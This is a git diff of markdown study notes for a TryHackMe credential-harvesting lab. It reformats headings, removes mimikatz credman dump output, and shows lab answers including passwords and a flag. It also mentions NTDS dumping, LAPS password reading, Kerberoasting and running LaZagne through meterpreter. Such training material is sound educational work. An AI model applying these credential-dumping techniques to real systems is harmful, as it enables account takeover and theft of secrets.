@@ -1,5 +1,5 @@
 # Credharvesting
-![|777](https://tryhackme-images.s3.amazonaws.com/room-icons/1ab32f03262d2277c032ea836ef83bed.png)
+<img src="https://tryhackme-images.s3.amazonaws.com/room-icons/1ab32f03262d2277c032ea836ef83bed.png" alt="Alt Text" width="650" height="500">
 - After gaining access to a system we need to find creds.
 
 ## Task 1 Intro
@@ -394,166 +394,6 @@ Using THM user access, check the Web Credentials.
 ```
 mimikatz # sekurlsa::credman
 
-Authentication Id : 0 ; 746421 (00000000:000b63b5)
-Session           : Interactive from 2
-User Name         : DWM-2
-Domain            : Window Manager
-Logon Server      : (null)
-Logon Time        : 9/26/2022 4:16:30 PM
-SID               : S-1-5-90-0-2
-        credman :
-
-Authentication Id : 0 ; 744851 (00000000:000b5d93)
-Session           : Interactive from 2
-User Name         : UMFD-2
-Domain            : Font Driver Host
-Logon Server      : (null)
-Logon Time        : 9/26/2022 4:16:29 PM
-SID               : S-1-5-96-0-2
-        credman :
-
-Authentication Id : 0 ; 744759 (00000000:000b5d37)
-Session           : Interactive from 2
-User Name         : UMFD-2
-Domain            : Font Driver Host
-Logon Server      : (null)
-Logon Time        : 9/26/2022 4:16:29 PM
-SID               : S-1-5-96-0-2
-        credman :
-
-Authentication Id : 0 ; 63677 (00000000:0000f8bd)
-Session           : Interactive from 1
-User Name         : DWM-1
-Domain            : Window Manager
-Logon Server      : (null)
-Logon Time        : 9/26/2022 4:15:01 PM
-SID               : S-1-5-90-0-1
-        credman :
-
-Authentication Id : 0 ; 996 (00000000:000003e4)
-Session           : Service from 0
-User Name         : CREDS-HARVESTIN$
-Domain            : THM
-Logon Server      : (null)
-Logon Time        : 9/26/2022 4:14:59 PM
-SID               : S-1-5-20
-        credman :
-
-Authentication Id : 0 ; 34485 (00000000:000086b5)
-Session           : Interactive from 1
-User Name         : UMFD-1
-Domain            : Font Driver Host
-Logon Server      : (null)
-Logon Time        : 9/26/2022 4:14:58 PM
-SID               : S-1-5-96-0-1
-        credman :
-
-Authentication Id : 0 ; 34455 (00000000:00008697)
-Session           : Interactive from 0
-User Name         : UMFD-0
-Domain            : Font Driver Host
-Logon Server      : (null)
-Logon Time        : 9/26/2022 4:14:58 PM
-SID               : S-1-5-96-0-0
-        credman :
-
-Authentication Id : 0 ; 34445 (00000000:0000868d)
-Session           : Interactive from 1
-User Name         : UMFD-1
-Domain            : Font Driver Host
-Logon Server      : (null)
-Logon Time        : 9/26/2022 4:14:58 PM
-SID               : S-1-5-96-0-1
-        credman :
-
-Authentication Id : 0 ; 781648 (00000000:000bed50)
-Session           : RemoteInteractive from 2
-User Name         : thm
-Domain            : THM
-Logon Server      : CREDS-HARVESTIN
-Logon Time        : 9/26/2022 4:16:33 PM
-SID               : S-1-5-21-1966530601-3185510712-10604624-1114
-        credman :
-         [00000000]
-         * Username : thm
-         * Domain   : 10.10.237.226
-         * Password : jfxKruLkkxoPjwe3
-         [00000001]
-         * Username : thm.red\thm-local
-         * Domain   : thm.red\thm-local
-         * Password : Passw0rd123
-
-Authentication Id : 0 ; 781445 (00000000:000bec85)
-Session           : RemoteInteractive from 2
-User Name         : thm
-Domain            : THM
-Logon Server      : CREDS-HARVESTIN
-Logon Time        : 9/26/2022 4:16:33 PM
-SID               : S-1-5-21-1966530601-3185510712-10604624-1114
-        credman :
-         [00000000]
-         * Username : thm
-         * Domain   : 10.10.237.226
-         * Password : jfxKruLkkxoPjwe3
-         [00000001]
-         * Username : thm.red\thm-local
-         * Domain   : thm.red\thm-local
-         * Password : Passw0rd123
-
-Authentication Id : 0 ; 745669 (00000000:000b60c5)
-Session           : Interactive from 2
-User Name         : DWM-2
-Domain            : Window Manager
-Logon Server      : (null)
-Logon Time        : 9/26/2022 4:16:29 PM
-SID               : S-1-5-90-0-2
-        credman :
-
-Authentication Id : 0 ; 995 (00000000:000003e3)
-Session           : Service from 0
-User Name         : IUSR
-Domain            : NT AUTHORITY
-Logon Server      : (null)
-Logon Time        : 9/26/2022 4:15:24 PM
-SID               : S-1-5-17
-        credman :
-
-Authentication Id : 0 ; 997 (00000000:000003e5)
-Session           : Service from 0
-User Name         : LOCAL SERVICE
-Domain            : NT AUTHORITY
-Logon Server      : (null)
-Logon Time        : 9/26/2022 4:15:01 PM
-SID               : S-1-5-19
-        credman :
-
-Authentication Id : 0 ; 63658 (00000000:0000f8aa)
-Session           : Interactive from 1
-User Name         : DWM-1
-Domain            : Window Manager
-Logon Server      : (null)
-Logon Time        : 9/26/2022 4:15:01 PM
-SID               : S-1-5-90-0-1
-        credman :
-
-Authentication Id : 0 ; 34424 (00000000:00008678)
-Session           : Interactive from 0
-User Name         : UMFD-0
-Domain            : Font Driver Host
-Logon Server      : (null)
-Logon Time        : 9/26/2022 4:14:58 PM
-SID               : S-1-5-96-0-0
-        credman :
-
-Authentication Id : 0 ; 31587 (00000000:00007b63)
-Session           : UndefinedLogonType from 0
-User Name         : (null)
-Domain            : (null)
-Logon Server      : (null)
-Logon Time        : 9/26/2022 4:14:48 PM
-SID               :
-        credman :
-
 Authentication Id : 0 ; 999 (00000000:000003e7)
 Session           : UndefinedLogonType from 0
 User Name         : CREDS-HARVESTIN$
@@ -565,7 +405,7 @@ SID               : S-1-5-18
 ```
 
 Use Mimikatz to memory dump the credentials for the 10.10.237.226 SMB share which is stored in the Windows Credential vault. What is the password?
-Remember to run Mimikatz as System Administrator!
+Remember to run Mimikatz as Administrator!
 *jfxKruLkkxoPjwe3*
 
 
@@ -607,12 +447,7 @@ C:\Windows\system32>
 
 *THM{RunA5S4veCr3ds}*
 
-### Domain Controller 
-
-This task discusses the required steps to dump Domain Controller Hashes locally and remotely.
-
-NTDS Domain Controller
-
+## Task 7 Domain Controller 
 New Technologies Directory Services (NTDS) is a database containing all Active Directory data, including objects, attributes, credentials, etc. The NTDS.DTS data consists of three tables as follows:
 
     Schema table: it contains types of objects and their relationships.
@@ -1083,11 +918,7 @@ What is the clear-text password for the bk-admin username?
 *Passw0rd123 *
 
 
-### Local Administrator Password Solution (LAPS) 
-
-This task discusses how to enumerate and obtain a local administrator password within the Active Directory environment if a LAPS feature is configured and enabled.
-
-Group Policy Preferences (GPP)
+## Task 8 Local Administrator Password Solution (LAPS) 
 
 A Windows OS has a built-in Administrator account which can be accessed using a password. Changing passwords in a large Windows environment with many computers is challenging. Therefore, Microsoft implemented a method to change local administrator accounts across workstations using Group Policy Preferences (GPP).
 
@@ -1101,7 +932,7 @@ In 2015, Microsoft removed storing the encrypted password in the SYSVOL folder. 
 
 The new method includes two new attributes (ms-mcs-AdmPwd and ms-mcs-AdmPwdExpirationTime) of computer objects in the Active Directory. The ms-mcs-AdmPwd attribute contains a clear-text password of the local administrator, while the ms-mcs-AdmPwdExpirationTime contains the expiration time to reset the password. LAPS uses admpwd.dll to change the local administrator password and update the value of ms-mcs-AdmPwd.
 
-![](https://tryhackme-images.s3.amazonaws.com/user-uploads/5d617515c8cd8348d0b4e68f/room-content/ecdb1fcaee158d79297978a49d52b9dd.png)
+
 
 
 Enumerate for LAPS
@@ -1314,7 +1145,7 @@ Which user is able to read LAPS passwords?
 Enumerate for members of the group you found in the question #1.
 *bk-admin*
 
-### Other Attacks 
+## Task 9 Other Attacks 
 
 In the previous tasks, the assumption is that we already had initial access to a system and were trying to obtain credentials from memory or various files within the Windows operating system. In other scenarios, it is possible to perform attacks in a victim network to obtain credentials.
 
@@ -1582,11 +1413,11 @@ Enumerate for SPN users using the Impacket GetUserSPNs script. What is the Servi
 After finding the SPN account from the previous question, perform the Kerberoasting attack to grab the TGS ticket and crack it. What is the password?
 *Passw0rd1*
 
-### Conclusion 
+### Task 10 Conclusion 
 
 
 
-Recap
+### Recap
 
 In this room, we discussed the various approaches to obtaining users' credentials, including the local computer and Domain Controller, which conclude the following:
 
@@ -1600,36 +1431,3 @@ The following tools may be worth trying to scan a target machine (files, memory,
     Snaffler  https://github.com/SnaffCon/Snaffler
     Seatbelt  https://github.com/GhostPack/Seatbelt
     Lazagne   https://www.hackingarticles.in/post-exploitation-on-saved-password-with-lazagne/  INTERESTING using metasploit[meterpreter] then upload lazagne.exe (for getting google pass, databases and more)
-
-
-
-
-
-
-
-
-
-## Task 7 Domain Controller
-
-
-
-
-
-
-
-
-
-
-
-## Task 8 Local Administrator Password Solution (LAPS)
-
-
-
-## Task 9 Other Attacks
-
-
-
-## Task 10 Conclusion 
-        
-
-
